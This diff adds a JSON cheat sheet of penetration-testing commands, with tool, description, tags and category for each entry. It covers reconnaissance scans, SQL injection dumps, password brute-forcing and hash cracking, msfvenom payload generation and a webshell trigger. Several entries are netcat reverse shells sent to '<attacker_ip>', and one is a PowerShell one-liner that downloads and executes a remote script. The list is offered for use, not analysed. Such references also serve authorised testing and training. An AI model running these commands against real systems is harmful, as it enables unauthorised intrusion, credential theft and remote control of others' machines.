@@ -1,0 +1,669 @@
+[
+  {
+    "tool": "sqlmap",
+    "command": "sqlmap -u http://example.com --dump",
+    "description": "SQL injection data dump",
+    "tags": [
+      "sqlmap",
+      "sqli"
+    ],
+    "category": "injection",
+    "created_at": "2025-06-29T13:22:11",
+    "updated_at": "2025-06-29T13:22:11"
+  },
+  {
+    "tool": "smbclient",
+    "command": "smbclient -L //ip -U anonymous",
+    "description": "list shares on the smb server",
+    "tags": [
+      "smb",
+      "shares",
+      "scan"
+    ],
+    "category": "recon",
+    "created_at": "2025-06-27T19:50:06",
+    "updated_at": "2025-06-27T19:50:06"
+  },
+  {
+    "tool": "ftp",
+    "command": "ftp ip",
+    "description": "connect to ftp",
+    "tags": [
+      "ftp",
+      "file transfer"
+    ],
+    "category": "recon"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -sV <target>",
+    "description": "Service/version detection",
+    "tags": [
+      "nmap",
+      "scan",
+      "version"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-01T10:00:00",
+    "updated_at": "2025-06-27T21:20:47"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -sC <target>",
+    "description": "Default script scan",
+    "tags": [
+      "nmap",
+      "scan",
+      "script"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-01T10:05:00",
+    "updated_at": "2025-06-27T21:20:55"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -F <target>",
+    "description": "Fast scan with fewer ports",
+    "tags": [
+      "nmap",
+      "scan",
+      "fast"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-01T10:10:00",
+    "updated_at": "2025-06-27T21:21:03"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -A -T4 <target>",
+    "description": "Aggressive scan with OS detection, version, script scanning, and traceroute",
+    "tags": [
+      "nmap",
+      "aggressive",
+      "scan",
+      "os-detection"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-01T10:20:00",
+    "updated_at": "2025-06-27T21:24:53"
+  },
+  {
+    "tool": "dirsearch",
+    "command": "dirsearch -u <url> -e php,html,txt",
+    "description": "Directory brute-force with specific extensions",
+    "tags": [
+      "dirsearch",
+      "directory",
+      "bruteforce",
+      "web"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-01T11:00:00",
+    "updated_at": "2024-01-01T11:00:00"
+  },
+  {
+    "tool": "enum4linux",
+    "command": "enum4linux -a <ip>",
+    "description": "Enumerate SMB shares and users on Windows machines",
+    "tags": [
+      "enum4linux",
+      "smb",
+      "windows",
+      "enumeration"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-01T11:10:00",
+    "updated_at": "2024-01-01T11:10:00"
+  },
+  {
+    "tool": "linpeas",
+    "command": "./linpeas.sh",
+    "description": "Linux Privilege Escalation Audit Script",
+    "tags": [
+      "linux",
+      "privilege",
+      "escalation",
+      "privesc",
+      "linpeas"
+    ],
+    "category": "post",
+    "created_at": "2024-01-01T11:20:00",
+    "updated_at": "2024-01-01T11:20:00"
+  },
+  {
+    "tool": "gobuster",
+    "command": "gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt",
+    "description": "Web directory brute-force with common wordlist",
+    "tags": [
+      "gobuster",
+      "dir",
+      "scan",
+      "web"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-01T11:30:00",
+    "updated_at": "2024-01-01T11:30:00"
+  },
+  {
+    "tool": "sqlmap",
+    "command": "sqlmap -u <url> --dbs",
+    "description": "Basic SQL injection to enumerate databases",
+    "tags": [
+      "sqlmap",
+      "sqli",
+      "database",
+      "web"
+    ],
+    "category": "attack",
+    "created_at": "2024-01-01T11:40:00",
+    "updated_at": "2024-01-01T11:40:00"
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf",
+    "description": "Generate reverse shell payload for Linux",
+    "tags": [
+      "msfvenom",
+      "reverse shell",
+      "payload",
+      "exploit"
+    ],
+    "category": "post",
+    "created_at": "2024-01-01T11:50:00",
+    "updated_at": "2024-01-01T11:50:00"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -Pn -p- <target>",
+    "description": "Scan all ports without pinging",
+    "tags": [
+      "nmap",
+      "port",
+      "scan",
+      "stealth"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-02T10:00:00",
+    "updated_at": "2024-01-02T10:00:00"
+  },
+  {
+    "tool": "nmap",
+    "command": "nmap -sU -p 161 <target>",
+    "description": "UDP scan for SNMP",
+    "tags": [
+      "nmap",
+      "udp",
+      "scan",
+      "snmp"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-02T10:05:00",
+    "updated_at": "2024-01-02T10:05:00"
+  },
+  {
+    "tool": "gobuster",
+    "command": "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt",
+    "description": "Directory brute-forcing",
+    "tags": [
+      "gobuster",
+      "dirb",
+      "web",
+      "fuzzing"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T10:10:00",
+    "updated_at": "2024-01-02T10:10:00"
+  },
+  {
+    "tool": "nikto",
+    "command": "nikto -h http://<target>",
+    "description": "Web vulnerability scan",
+    "tags": [
+      "nikto",
+      "web",
+      "vuln",
+      "scan"
+    ],
+    "category": "scan",
+    "created_at": "2024-01-02T10:15:00",
+    "updated_at": "2024-01-02T10:15:00"
+  },
+  {
+    "tool": "sqlmap",
+    "command": "sqlmap -u 'http://<target>/vuln.php?id=1' --batch --dbs",
+    "description": "SQL injection and DB discovery",
+    "tags": [
+      "sqlmap",
+      "sql",
+      "injection",
+      "database"
+    ],
+    "category": "attack",
+    "created_at": "2024-01-02T10:20:00",
+    "updated_at": "2024-01-02T10:20:00"
+  },
+  {
+    "tool": "hydra",
+    "command": "hydra -l admin -P rockyou.txt ftp://<target>",
+    "description": "Brute-force FTP login",
+    "tags": [
+      "hydra",
+      "bruteforce",
+      "ftp"
+    ],
+    "category": "attack",
+    "created_at": "2024-01-02T10:25:00",
+    "updated_at": "2024-01-02T10:25:00"
+  },
+  {
+    "tool": "john",
+    "command": "john --wordlist=rockyou.txt hashes.txt",
+    "description": "Password cracking with John the Ripper",
+    "tags": [
+      "john",
+      "crack",
+      "passwords"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T10:30:00",
+    "updated_at": "2024-01-02T10:30:00"
+  },
+  {
+    "tool": "hashcat",
+    "command": "hashcat -m 0 -a 0 hashes.txt rockyou.txt",
+    "description": "Hash cracking using Hashcat",
+    "tags": [
+      "hashcat",
+      "hashes",
+      "crack"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T10:35:00",
+    "updated_at": "2024-01-02T10:35:00"
+  },
+  {
+    "tool": "netcat",
+    "command": "nc -lvnp 4444",
+    "description": "Start a Netcat listener",
+    "tags": [
+      "netcat",
+      "reverse",
+      "listener"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T10:40:00",
+    "updated_at": "2024-01-02T10:40:00"
+  },
+  {
+    "tool": "netcat",
+    "command": "nc <attacker_ip> 4444 -e /bin/bash",
+    "description": "Send reverse shell to attacker",
+    "tags": [
+      "netcat",
+      "reverse",
+      "shell"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T10:45:00",
+    "updated_at": "2024-01-02T10:45:00"
+  },
+  {
+    "tool": "smbclient",
+    "command": "smbclient -L //<target>/ -N",
+    "description": "List SMB shares anonymously",
+    "tags": [
+      "smb",
+      "recon",
+      "shares"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T10:50:00",
+    "updated_at": "2024-01-02T10:50:00"
+  },
+  {
+    "tool": "crackmapexec",
+    "command": "crackmapexec smb <target> -u users.txt -p passwords.txt",
+    "description": "Password spray against SMB",
+    "tags": [
+      "cme",
+      "smb",
+      "attack",
+      "bruteforce"
+    ],
+    "category": "attack",
+    "created_at": "2024-01-02T10:55:00",
+    "updated_at": "2024-01-02T10:55:00"
+  },
+  {
+    "tool": "enum4linux",
+    "command": "enum4linux -a <target>",
+    "description": "Full enumeration of Windows system",
+    "tags": [
+      "windows",
+      "enum",
+      "smb",
+      "linux"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:00:00",
+    "updated_at": "2024-01-02T11:00:00"
+  },
+  {
+    "tool": "dirsearch",
+    "command": "dirsearch -u http://<target> -e php,html",
+    "description": "Directory brute-forcing with extension filter",
+    "tags": [
+      "dirsearch",
+      "web",
+      "directories"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:05:00",
+    "updated_at": "2024-01-02T11:05:00"
+  },
+  {
+    "tool": "whatweb",
+    "command": "whatweb http://<target>",
+    "description": "Identify web technologies",
+    "tags": [
+      "whatweb",
+      "web",
+      "technology"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:10:00",
+    "updated_at": "2024-01-02T11:10:00"
+  },
+  {
+    "tool": "wpscan",
+    "command": "wpscan --url http://<target> --enumerate u",
+    "description": "WordPress user enumeration",
+    "tags": [
+      "wpscan",
+      "wordpress",
+      "enum",
+      "users"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:15:00",
+    "updated_at": "2024-01-02T11:15:00"
+  },
+  {
+    "tool": "msfconsole",
+    "command": "msfconsole -q -x 'use exploit/multi/handler'",
+    "description": "Start Metasploit handler",
+    "tags": [
+      "metasploit",
+      "reverse",
+      "handler"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T11:20:00",
+    "updated_at": "2024-01-02T11:20:00"
+  },
+  {
+    "tool": "searchsploit",
+    "command": "searchsploit apache",
+    "description": "Search exploits for Apache",
+    "tags": [
+      "searchsploit",
+      "exploit",
+      "db"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:25:00",
+    "updated_at": "2024-01-02T11:25:00"
+  },
+  {
+    "tool": "curl",
+    "command": "curl -I http://<target>",
+    "description": "Get HTTP response headers",
+    "tags": [
+      "curl",
+      "http",
+      "headers"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:30:00",
+    "updated_at": "2024-01-02T11:30:00"
+  },
+  {
+    "tool": "openssl",
+    "command": "openssl s_client -connect <target>:443",
+    "description": "Check SSL cert and TLS config",
+    "tags": [
+      "openssl",
+      "tls",
+      "ssl",
+      "check"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:35:00",
+    "updated_at": "2024-01-02T11:35:00"
+  },
+  {
+    "tool": "amass",
+    "command": "amass enum -d example.com",
+    "description": "Subdomain enumeration",
+    "tags": [
+      "amass",
+      "dns",
+      "subdomain"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:40:00",
+    "updated_at": "2024-01-02T11:40:00"
+  },
+  {
+    "tool": "sublist3r",
+    "command": "sublist3r -d example.com",
+    "description": "Subdomain enumeration with Sublist3r",
+    "tags": [
+      "subdomain",
+      "dns",
+      "enum"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:45:00",
+    "updated_at": "2024-01-02T11:45:00"
+  },
+  {
+    "tool": "ftp",
+    "command": "ftp <target>",
+    "description": "Connect to FTP server",
+    "tags": [
+      "ftp",
+      "connect"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T11:50:00",
+    "updated_at": "2024-01-02T11:50:00"
+  },
+  {
+    "tool": "nc",
+    "command": "nc -w 3 <target> 80 < /dev/null",
+    "description": "Check if port 80 is open",
+    "tags": [
+      "netcat",
+      "port",
+      "check"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T11:55:00",
+    "updated_at": "2024-01-02T11:55:00"
+  },
+  {
+    "tool": "whois",
+    "command": "whois example.com",
+    "description": "Get domain WHOIS info",
+    "tags": [
+      "whois",
+      "domain",
+      "lookup"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T12:00:00",
+    "updated_at": "2024-01-02T12:00:00"
+  },
+  {
+    "tool": "linpeas",
+    "command": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
+    "description": "Run LinPEAS for Linux privilege escalation checks",
+    "tags": [
+      "linux",
+      "privesc",
+      "linpeas",
+      "enumeration"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:05:00",
+    "updated_at": "2024-01-02T12:05:00"
+  },
+  {
+    "tool": "smbmap",
+    "command": "smbmap -H <target>",
+    "description": "Enumerate SMB shares with smbmap",
+    "tags": [
+      "smbmap",
+      "shares",
+      "smb",
+      "enum"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T12:10:00",
+    "updated_at": "2024-01-02T12:10:00"
+  },
+  {
+    "tool": "ldapsearch",
+    "command": "ldapsearch -x -H ldap://<target> -b \"dc=domain,dc=com\"",
+    "description": "Anonymous LDAP enumeration",
+    "tags": [
+      "ldap",
+      "ad",
+      "enum",
+      "ldapsearch"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T12:15:00",
+    "updated_at": "2024-01-02T12:15:00"
+  },
+  {
+    "tool": "wget",
+    "command": "wget http://<target>/file.txt",
+    "description": "Download a file from a web server",
+    "tags": [
+      "wget",
+      "download",
+      "web"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:20:00",
+    "updated_at": "2024-01-02T12:20:00"
+  },
+  {
+    "tool": "curl",
+    "command": "curl http://<target>/shell.php",
+    "description": "Trigger a webshell with curl",
+    "tags": [
+      "curl",
+      "webshell",
+      "reverse"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:25:00",
+    "updated_at": "2024-01-02T12:25:00"
+  },
+  {
+    "tool": "dig",
+    "command": "dig axfr @<target> domain.com",
+    "description": "DNS zone transfer",
+    "tags": [
+      "dns",
+      "dig",
+      "zone-transfer"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T12:30:00",
+    "updated_at": "2024-01-02T12:30:00"
+  },
+  {
+    "tool": "ncat",
+    "command": "ncat -nlvp 5555 --ssl",
+    "description": "Start a secure Netcat listener",
+    "tags": [
+      "ncat",
+      "ssl",
+      "reverse-shell"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:35:00",
+    "updated_at": "2024-01-02T12:35:00"
+  },
+  {
+    "tool": "nc",
+    "command": "nc -e /bin/sh <attacker_ip> 1234",
+    "description": "Linux reverse shell using Netcat",
+    "tags": [
+      "netcat",
+      "shell",
+      "reverse",
+      "post"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:40:00",
+    "updated_at": "2024-01-02T12:40:00"
+  },
+  {
+    "tool": "powershell",
+    "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/shell.ps1')\"",
+    "description": "Download and execute PowerShell payload",
+    "tags": [
+      "powershell",
+      "windows",
+      "payload"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:45:00",
+    "updated_at": "2024-01-02T12:45:00"
+  },
+  {
+    "tool": "msfvenom",
+    "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf",
+    "description": "Generate Linux Meterpreter payload",
+    "tags": [
+      "msfvenom",
+      "payload",
+      "meterpreter"
+    ],
+    "category": "attack",
+    "created_at": "2024-01-02T12:50:00",
+    "updated_at": "2024-01-02T12:50:00"
+  },
+  {
+    "tool": "scp",
+    "command": "scp file.txt user@<target>:/tmp/",
+    "description": "Securely copy a file to target",
+    "tags": [
+      "scp",
+      "file",
+      "transfer",
+      "linux"
+    ],
+    "category": "post",
+    "created_at": "2024-01-02T12:55:00",
+    "updated_at": "2024-01-02T12:55:00"
+  },
+  {
+    "tool": "netstat",
+    "command": "netstat -tulpn",
+    "description": "List open ports and services",
+    "tags": [
+      "netstat",
+      "ports",
+      "network"
+    ],
+    "category": "recon",
+    "created_at": "2024-01-02T13:00:00",
+    "updated_at": "2024-01-02T13:00:00"
+  }
+]
